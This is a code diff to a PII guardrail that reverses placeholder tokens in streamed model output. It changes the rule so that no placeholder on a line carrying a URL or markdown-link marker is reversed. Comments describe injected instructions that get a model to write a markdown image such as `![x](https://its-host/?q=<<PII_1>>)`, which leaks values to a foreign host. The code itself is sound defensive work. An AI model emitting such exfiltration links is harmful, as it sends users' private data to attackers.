@@ -17,8 +17,8 @@ from ffcore.guardrails.findings import Finding
 
 KEEP_VISIBLE = 4
 PLACEHOLDER = re.compile(r"<<PII_\d+>>")
-# plan/08 C17: a stream holds at most 16 characters while a placeholder may still be open:
-# `<<PII_` + up to 8 digits + `>>`. A longer run is not a placeholder and passes as it is.
+# plan/08 C17: the longest placeholder is 16 characters (`<<PII_` + up to 8 digits + `>>`); a
+# stream holds at most 15 while one may still be open. A longer run passes as it is.
 PLACEHOLDER_MAX_CHARS = 16
 _OPEN_PLACEHOLDER = re.compile(r"<(?:<(?:P(?:I(?:I(?:_(?:\d{1,8}>?)?)?)?)?)?)?")
 
@@ -258,43 +258,122 @@ class PlaceholderAligner:
         return held
 
 
-# r1 MAJOR-3 (KARARLAR "C17 geri çevirme bağlam istisnası", A): a placeholder inside a URL or
-# a markdown link/image target is not reversed. An upstream (external agent, provider, injected
+# r1 MAJOR-3 and r2 MAJOR-r2-1 (KARARLAR "C17 geri çevirme bağlam istisnası" and "C17 URL bağlam
+# kuralı satır düzeyinde ve fail-closed"): an upstream (external agent, provider, injected
 # instruction) could write `![x](https://its-host/?q=<<PII_1>>)`, and a client that loads images
-# would send the value to that host. Contexts run up to the next whitespace: a markdown target
-# `](...`, an `href=...` attribute value, a bare `scheme://...`.
-_URL_CONTEXT = re.compile(r"\]\(\S*|\bhref\s*=\s*\S*|\b[a-z][a-z0-9+.-]*://\S*", re.IGNORECASE)
-# How much of the text before a chunk a stream keeps to see a URL that began earlier: the text
-# after the last whitespace, at most this long (a longer URL loses its start: a known limit).
+# would send the value to that host. The rule is per line, not per URL, so a respelling
+# (`]( //host`, a reference definition, an angle target, an HTML attribute) does not get through:
+# no placeholder on a line that carries one of these markers is reversed.
+_URL_MARKER = re.compile(
+    r"\]\(|\]:|//|\b(?:src|href|srcset|action|poster|background)\s*=", re.IGNORECASE
+)
+# What opens a target that may go on past the end of its line (a quoted attribute value, a
+# markdown destination, `]:` or `=` with the value on the next line): the next line is under the
+# rule too, until the target closes.
+_URL_OPENER = re.compile(
+    r"\]\(<|\]\(|\]:|\b(?:src|href|srcset|action|poster|background)\s*=", re.IGNORECASE
+)
+_LINE_BREAK = re.compile(r"\r\n|\r|\n")
+_PARENS = re.compile(r"[()]")
+_TARGET_OPEN = {'"': "dq", "'": "sq", "<": "angle"}
+_TARGET_CLOSE = {"dq": '"', "sq": "'", "angle": ">"}
+# How much of a stream's current line is kept to see a marker split over chunks; a line longer
+# than this lost its start and its placeholders are kept (fail-closed).
 URL_CONTEXT_MAX_CHARS = 8192
 
 
-def _url_spans(text: str) -> list[tuple[int, int]]:
-    return [m.span() for m in _URL_CONTEXT.finditer(text)]
+def _open_target(line: str, mode: str | int | None) -> str | int | None:
+    """The target still open at the end of `line`, given the one open at its start: None, a
+    markdown destination's paren depth, "expect" (a value is due) or the quote/angle that
+    closes it."""
+    i = 0
+    while i < len(line):
+        if mode == "expect":
+            while i < len(line) and line[i] in " \t":
+                i += 1
+            if i == len(line):
+                return mode
+            mode = _TARGET_OPEN.get(line[i])
+            i += 1 if mode else 0
+        elif mode is None:
+            opener = _URL_OPENER.search(line, i)
+            if opener is None:
+                return None
+            i, token = opener.end(), opener.group(0)
+            mode = "angle" if token == "](<" else 1 if token == "](" else "expect"
+        elif isinstance(mode, int):
+            paren = _PARENS.search(line, i)
+            if paren is None:
+                return mode
+            i = paren.end()
+            mode = mode + 1 if paren.group(0) == "(" else (mode - 1 or None)
+        else:
+            j = line.find(_TARGET_CLOSE[mode], i)
+            if j < 0:
+                return mode
+            mode, i = None, j + 1
+    return mode
 
 
-def _context_tail(text: str) -> str:
-    cut = max(text.rfind(c) for c in " \t\n\r")
-    return text[cut + 1 :][-URL_CONTEXT_MAX_CHARS:]
+class UrlLines:
+    """Which parts of a text, or of a stream fed piece by piece, sit on a URL line: `spans` takes
+    the next piece and returns its (start, end) ranges whose placeholders are kept."""
+
+    def __init__(self) -> None:
+        self._line = ""  # the current line so far, at most URL_CONTEXT_MAX_CHARS of its end
+        self._cut = False  # the current line is longer than that
+        self._marked = False  # a marker was seen on the current line
+        self._open: str | int | None = None  # the target open at the start of the current line
+        self._lost = False  # a URL line lost its start: what it left open is unknown
+
+    def spans(self, text: str) -> list[tuple[int, int]]:
+        out, start = [], 0
+        for brk in [*_LINE_BREAK.finditer(text), None]:
+            end = brk.start() if brk else len(text)
+            line = self._line + text[start:end]
+            if len(line) > URL_CONTEXT_MAX_CHARS:
+                line, self._cut = line[-URL_CONTEXT_MAX_CHARS:], True
+                # a marker whose spaces run across the cut (`src` + 8,000 spaces + `=`)
+                self._marked = self._marked or line.lstrip()[:1] == "=" != line[:1]
+            self._marked = self._marked or _URL_MARKER.search(line) is not None
+            self._line = line
+            if self._lost or self._open is not None or self._marked or self._cut:
+                out.append((start, end))
+            if brk is None:
+                return out
+            self._end_line()
+            start = brk.end()
+        return out
+
+    def _end_line(self) -> None:
+        if self._marked or self._open is not None:
+            if self._cut:
+                self._lost = True
+            elif not self._lost:
+                self._open = _open_target(self._line, self._open)
+        self._line, self._cut, self._marked = "", False, False
 
 
 async def reveal_text(
-    text: str, *, store: TokenStore, scope: str, context: str = "", json_escape: bool = False
+    text: str,
+    *,
+    store: TokenStore,
+    scope: str,
+    lines: UrlLines | None = None,
+    json_escape: bool = False,
 ) -> tuple[str, int, int]:
-    """(text with this scope's placeholders turned back into values, unresolved count, kept in a
-    URL count). `context` is the text that came just before in the same stream, so a URL that
-    began in an earlier chunk is seen. `json_escape` writes each value as it must appear inside
-    a JSON string (tool call arguments, r1 MINOR-3)."""
+    """(text with this scope's placeholders turned back into values, unresolved count, kept on a
+    URL line count). `lines` carries a stream's state from its earlier pieces; without it the
+    text stands alone. `json_escape` writes each value as it must appear inside a JSON string
+    (tool call arguments, r1 MINOR-3)."""
+    spans = (lines or UrlLines()).spans(text)
     if "<<PII_" not in text:
         return text, 0, 0
-    whole = context + text
-    spans = _url_spans(whole)
-    shift = len(context)
     out, cursor, unresolved, skipped = [], 0, 0, 0
     for match in PLACEHOLDER.finditer(text):
-        start, end = match.start() + shift, match.end() + shift
-        out.append(text[cursor : match.start()])
-        cursor = match.end()
+        start, end = match.span()
+        out.append(text[cursor:start])
+        cursor = end
         if any(a <= start and end <= b for a, b in spans):
             skipped += 1
             out.append(match.group(0))
@@ -312,25 +391,20 @@ async def reveal_text(
 class StreamDetokenizer:
     """Aligner + reversal for a stream one request writes and reads (the facade's direct model
     path): no chunk it returns contains a placeholder the scope issued, split or whole, except
-    inside a URL (kept, `skipped_url`). `unresolved` counts placeholders the scope never issued
+    on a URL line (kept, `skipped_url`). `unresolved` counts placeholders the scope never issued
     (left as they are)."""
 
     def __init__(self, store: TokenStore, scope: str, *, json_escape: bool = False) -> None:
         self._store, self._scope, self._json = store, scope, json_escape
         self._aligner = PlaceholderAligner()
-        self._context = ""
+        self._lines = UrlLines()
         self.unresolved = 0
         self.skipped_url = 0
 
     async def _reverse(self, text: str) -> str:
         out, unresolved, skipped = await reveal_text(
-            text,
-            store=self._store,
-            scope=self._scope,
-            context=self._context,
-            json_escape=self._json,
+            text, store=self._store, scope=self._scope, lines=self._lines, json_escape=self._json
         )
-        self._context = _context_tail(self._context + text)
         self.unresolved += unresolved
         self.skipped_url += skipped
         return out
@@ -344,20 +418,20 @@ class StreamDetokenizer:
 
 class ContextReveal:
     """Reversal of a run's event data (C17), one reader: strings within the scope; the `token`
-    events of a live stream share a context, so a URL split over two entries is seen."""
+    events of a live stream share their URL line state, so a URL split over two entries is
+    seen."""
 
     def __init__(self, store: TokenStore, scope: str) -> None:
         self._store, self._scope = store, scope
-        self._context = ""
+        self._lines = UrlLines()
         self.unresolved = 0
         self.skipped_url = 0
 
     async def data(self, data: Any, *, stream_text: bool = False) -> Any:
         if stream_text and isinstance(data, dict) and isinstance(data.get("text"), str):
             text, unresolved, skipped = await reveal_text(
-                data["text"], store=self._store, scope=self._scope, context=self._context
+                data["text"], store=self._store, scope=self._scope, lines=self._lines
             )
-            self._context = _context_tail(self._context + data["text"])
             self.unresolved += unresolved
             self.skipped_url += skipped
             return {**data, "text": text}
@@ -369,8 +443,8 @@ class ContextReveal:
 
 async def detokenize_json(data: Any, *, store: TokenStore, scope: str) -> tuple[Any, int, int]:
     """(a copy of `data` with every string reversed within `scope`, unresolved count, kept in a
-    URL count): placeholders stay where the scope never issued them, the mapping expired or
-    they sit in a URL."""
+    URL line count): each string stands alone; placeholders stay where the scope never issued
+    them, the mapping expired or they sit on a URL line."""
     if isinstance(data, str):
         return await reveal_text(data, store=store, scope=scope)
     if isinstance(data, list):
